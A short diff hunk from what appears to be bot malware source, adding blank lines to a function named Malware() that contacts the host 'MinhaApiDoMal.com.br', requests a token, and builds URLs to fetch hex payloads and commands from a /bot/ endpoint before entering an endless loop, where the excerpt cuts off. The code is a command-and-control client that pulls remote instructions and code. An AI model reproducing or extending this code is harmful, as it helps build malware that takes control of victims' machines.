@@ -150,10 +150,12 @@ string GetOutput()
 void Malware()
 {
   string url = "MinhaApiDoMal.com.br";
+  
   string urlActionScript =  "/bot/gethex.php";
   
   string urlTokenAction = "/bot/generatetoken.php";
   string apiToken = DeserializeJson("token",HttpGet(url,urlTokenAction));
+  
   string urlActionCommand = "/bot/getcommand.php?token="+apiToken;
 
   while(true)
